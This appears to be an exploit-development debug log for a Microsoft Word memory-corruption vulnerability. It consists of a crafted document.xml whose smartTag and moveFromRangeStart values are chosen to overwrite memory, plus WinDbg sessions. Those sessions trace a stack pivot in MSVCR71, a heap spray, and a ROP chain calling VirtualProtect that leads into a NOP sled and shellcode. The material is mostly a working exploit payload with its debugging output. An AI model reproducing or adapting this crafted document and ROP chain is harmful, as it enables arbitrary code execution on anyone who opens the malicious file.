## Debug

``` xml

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:m="http://schemas.openxmlformats.org/officeDocument/2006/math" xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:ns6="http://schemas.openxmlformats.org/schemaLibrary/2006/main" xmlns:c="http://schemas.openxmlformats.org/drawingml/2006/chart" xmlns:ns8="http://schemas.openxmlformats.org/drawingml/2006/chartDrawing" xmlns:dgm="http://schemas.openxmlformats.org/drawingml/2006/diagram" xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture" xmlns:ns11="http://schemas.openxmlformats.org/drawingml/2006/spreadsheetDrawing" xmlns:dsp="http://schemas.microsoft.com/office/drawing/2008/diagram" xmlns:ns13="urn:schemas-microsoft-com:office:excel" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:w10="urn:schemas-microsoft-com:office:word" xmlns:ns17="urn:schemas-microsoft-com:office:powerpoint" xmlns:ns19="http://schemas.microsoft.com/office/2006/coverPageProps" xmlns:odx="http://opendope.org/xpaths" xmlns:odc="http://opendope.org/conditions" xmlns:odq="http://opendope.org/questions" xmlns:oda="http://opendope.org/answers" xmlns:odi="http://opendope.org/components" xmlns:odgm="http://opendope.org/SmartArt/DataHierarchy" xmlns:ns26="http://schemas.openxmlformats.org/officeDocument/2006/bibliography" xmlns:ns27="http://schemas.openxmlformats.org/drawingml/2006/compatibility" xmlns:ns28="http://schemas.openxmlformats.org/drawingml/2006/lockedCanvas">
<w:body>
...
<!-- 

char __stdcall sub_316D9841(unsigned int **ppelement, int element, unsigned int *moveFromRangeStart)
{
  char result; // al
  size_t size; // ST08_4
  unsigned int *Dst; // eax

  result = sub_316D9874(ppelement, element);    // *(pelement) + 1
  if ( result )
  {
    size = (*ppelement)[2];
    Dst = calc_Dst(ppelement, element);
    sub_316D76BC(moveFromRangeStart, Dst, size);// write moveFromRangeStart  element
    result = 1;
  }
  return result;
}


-->


<w:smartTag w:uri="urn:schemas:contacts" w:element="&#xBD50;&#x7C38;">
	<w:permStart w:id="1148" w:edGrp="everyone"/>
	<!-- FFFFE696 -> 0x7C38BD74 -->
		<w:moveFromRangeStart w:id="4294960790" w:name="ABCD" w:displacedByCustomXml="next"/>
		<w:moveFromRangeEnd w:id="4294960790" w:displacedByCustomXml="prev"/>
		
	<w:permEnd w:id="1148"/>
</w:smartTag>

<w:smartTag w:uri="urn:schemas:contacts" w:element="&#xBD68;&#x7C38;">
	<w:permStart w:id="4160223222" w:edGrp="everyone"/>
	<!-- 7C376FC3 -> 7c38a428
	kernel32!FlsGetValueStub
	
	7c376fc3 5e              pop     esi
	7c376fc4 5b              pop     ebx
	7c376fc5 8be5            mov     esp,ebp
	7c376fc7 5d              pop     ebp
	7c376fc8 8be3            mov     esp,ebx
	7c376fca 5b              pop     ebx
	7c376fcb c3              ret
	7c376fcc 55              push    ebp

	-->
		<w:moveFromRangeStart w:id="2084007875" w:name="ABCE" w:displacedByCustomXml="next"/>
		<w:moveFromRangeEnd w:id="2084007875" w:displacedByCustomXml="prev"/>
		
	<w:permEnd w:id="4160223222"/>
</w:smartTag>



<w:smartTag w:uri="urn:schemas:contacts" w:element="&#xBD60;&#x7C38;">
	<w:permStart w:id="1" w:edGrp="everyone"/>
	<!-- FFFFE656 -> 7c38bd8c 
	-->
		<w:moveFromRangeStart w:id="4294960726" w:name="ABCF" w:displacedByCustomXml="next"/>
		<w:moveFromRangeEnd w:id="4294960726" w:displacedByCustomXml="prev"/>
		
	<w:permEnd w:id="1"/>
</w:smartTag>

<w:smartTag w:uri="urn:schemas:contacts" w:element="&#xBD80;&#x7C38;">
	<w:permStart w:id="1" w:edGrp="everyone"/>

<!-- 9000808 -> 7c38a430 
	
	MSVCR71!aexit_rtn+0x4:
	7c38a430 0c00            or      al,0
	7c38a432 0000            add     byte ptr [eax],al
	
	
	0:000> dd 7c38a428
	7c38a428  7c376fc3 7c000000 09000808 00000000
	
	
0:000> bl
 0 e 64379829     0001 (0001)  0:**** wwlib!DllGetClassObject+0x424d ".if (ecx > 7c380000){} .else{g}"
 1 d 64379864     0001 (0001)  0:**** wwlib!DllGetClassObject+0x4288
 2 d 768d1e23     0001 (0001)  0:**** kernel32!FlsGetValue
 3 e 768d1e16     0001 (0001)  0:**** kernel32!FlsGetValueStub
 4 e 7c38a428 r 4 0001 (0001)  0:**** MSVCR71!__non_rtti_object::`vftable'+0xb3d0
0:000> g
Breakpoint 4 hit
eax=00000000 ebx=0028caa8 ecx=09000808 edx=00000020 esi=0b2bf638 edi=00000000
eip=7c376fc3 esp=0b2bf60c ebp=0b2bf624 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
MSVCR71!ldexp+0x20d7:
7c376fc3 5e              pop     esi
7c376fc4 5b              pop     ebx
7c376fc5 8be5            mov     esp,ebp
7c376fc7 5d              pop     ebp
7c376fc8 8be3            mov     esp,ebx
7c376fca 5b              pop     ebx
7c376fcb c3              ret
7c376fcc 55              push    ebp


0:001> kb
ChildEBP RetAddr  Args to Child              
WARNING: Stack unwind information not available. Following frames may be wrong.
0b2bf624 770289d8 7c340000 00000003 00000000 MSVCR71!ldexp+0x20d7
0b2bf644 76fff73a 7c34229b 7c340000 00000003 ntdll!LdrpCallInitRoutine+0x14
0b2bf6e8 76fff63b 00000002 00000000 0b2bf854 ntdll!LdrShutdownThread+0xe6
0b2bf6f8 76fff9be 00000000 7c2935b2 00000000 ntdll!RtlExitUserThread+0x2a
0b2bf854 768d3c45 001eb358 0b2bf8a0 770337f5 ntdll!TppWorkerThread+0x856
0b2bf860 770337f5 001eb358 7c293546 00000000 kernel32!BaseThreadInitThunk+0xe
0b2bf8a0 770337c8 770003e7 001eb358 ffffffff ntdll!__RtlUserThreadStart+0x70
0b2bf8b8 00000000 770003e7 001eb358 00000000 ntdll!_RtlUserThreadStart+0x1b

0:001> ub 770289d8 
ntdll!LdrpCallInitRoutine+0x3:
770289c7 56              push    esi
770289c8 57              push    edi
770289c9 53              push    ebx
770289ca 8bf4            mov     esi,esp
770289cc ff7514          push    dword ptr [ebp+14h]
770289cf ff7510          push    dword ptr [ebp+10h]
770289d2 ff750c          push    dword ptr [ebp+0Ch]
770289d5 ff5508          call    dword ptr [ebp+8]

0:001> dd esp
0b2bf60c  7c342278 [09000808] 7c342298 00000000
0b2bf61c  00000000 0b2bf638 0b2bf644 770289d8
0b2bf62c  7c340000 00000003 00000000 0028caa8
0b2bf63c  00000000 0028ce98 0b2bf6e8 76fff73a
0b2bf64c  7c34229b 7c340000 00000003 00000000
0b2bf65c  7c293b0e 001eb358 00000000 001eb358
0b2bf66c  001eb358 001eb358 00000000 77000239
0b2bf67c  7c293b1e 0b2bf6bc 0b2bf6bc 77040918


Breakpoint 1 hit
eax=00000000 ebx=003a5248 ecx=09000808 edx=00000020 esi=0174fd28 edi=00000000
eip=7c376fc3 esp=0174fcfc ebp=0174fd14 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
MSVCR71!ldexp+0x20d7:
7c376fc3 5e              pop     esi
0:001> dc 09000808 
09000808  7c342404 7c342404 7c342404 7c342404  .$4|.$4|.$4|.$4|
09000818  7c342404 7c342404 7c342404 7c342404  .$4|.$4|.$4|.$4|
09000828  7c342404 7c342404 7c342404 7c342404  .$4|.$4|.$4|.$4|
09000838  7c342404 7c342404 7c342404 7c342404  .$4|.$4|.$4|.$4|
09000848  7c342404 7c342404 7c342404 7c342404  .$4|.$4|.$4|.$4|
09000858  7c342404 7c342404 7c342404 7c342404  .$4|.$4|.$4|.$4|
09000868  7c342404 7c342404 7c342404 7c342404  .$4|.$4|.$4|.$4|
09000878  7c3651eb 7c3651eb 7c372b02 00000201  .Q6|.Q6|.+7|....

#ROP

0:001> dds 09000878
09000878  7c3651eb MSVCR71!mbsncoll+0x68
0900087c  7c3651eb MSVCR71!mbsncoll+0x68
09000880  7c372b02 MSVCR71!atoldbl+0x226
09000884  00000201
09000888  7c344364 MSVCR71!sin+0x98
0900088c  00000040
09000890  7c351a28 MSVCR71!tzset+0x71
09000894  7c390fc7 MSVCR71!_unguarded_readlc_active+0x5343
09000898  7c342e9e MSVCR71!strncat+0x118
0900089c  7c34a40f MSVCR71!get_sbh_threshold+0x3de
090008a0  7c3650dc MSVCR71!mbsnccnt+0x4c
090008a4  7c3415a3 MSVCR71!_crtLCMapStringA+0x1f4
090008a8  7c347f97 MSVCR71!cexit+0x8aa
090008ac  7c37a151 MSVCR71!ldexp+0x5265
090008b0  7c378c4d MSVCR71!ldexp+0x3d61
090008b4  7c345c30 MSVCR71!modf+0x772
090008b8  90909090
090008bc  90909090
090008c0  90909090
090008c4  90909090
090008c8  90909090
090008cc  90909090
090008d0  90909090
090008d4  8b64c931
090008d8  768b3071 kernel32!GetPrivateProfileStringW+0xb5
090008dc  0c768b0c
090008e0  8b308bad
090008e4  57eb1876
090008e8  56f38960
090008ec  8b3c738b
090008f0  01781e74
090008f4  768b56de kernel32!BaseFormatObjectAttributes+0x4b

0:001> p
eax=7c37a151 ebx=00000201 ecx=7c390fc7 edx=00000040 esi=7c3415a3 edi=7c34a40f
eip=7c347f98 esp=090008b0 ebp=7c3651eb iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
MSVCR71!cexit+0x8ab:
7c347f98 c3              ret
0:001> p
eax=7c37a151 ebx=00000201 ecx=7c390fc7 edx=00000040 esi=7c3415a3 edi=7c34a40f
eip=7c378c4d esp=090008b4 ebp=7c3651eb iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
MSVCR71!ldexp+0x3d61:
7c378c4d 60              pushad
0:001> p
eax=7c37a151 ebx=00000201 ecx=7c390fc7 edx=00000040 esi=7c3415a3 edi=7c34a40f
eip=7c378c4e esp=09000894 ebp=7c3651eb iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
MSVCR71!ldexp+0x3d62:
7c378c4e 04ef            add     al,0EFh
0:001> p
eax=7c37a140 ebx=00000201 ecx=7c390fc7 edx=00000040 esi=7c3415a3 edi=7c34a40f
eip=7c378c50 esp=09000894 ebp=7c3651eb iopl=0         nv up ei pl nz ac po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213
MSVCR71!ldexp+0x3d64:
7c378c50 c3              ret


eax=7c37a140 ebx=00000201 ecx=7c390fc7 edx=00000040 esi=7c3415a3 edi=7c34a40f
eip=7c3415a3 esp=0900089c ebp=7c3651eb iopl=0         nv up ei pl nz ac po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213
MSVCR71!_crtLCMapStringA+0x1f4:
7c3415a3 ff20            jmp     dword ptr [eax]      ds:0023:7c37a140={kernel32!VirtualProtectStub (768c2341)}

-->
		<w:moveFromRangeStart w:id="150997000" w:name="ABCG" w:displacedByCustomXml="next"/>
		<w:moveFromRangeEnd w:id="150997000" w:displacedByCustomXml="prev"/>
		
	<w:permEnd w:id="1"/>
</w:smartTag>


</w:p>
<w:cols w:space="720"/>
<w:docGrid w:linePitch="360"/>
</w:sectPr>
</w:body>
</w:document>


```
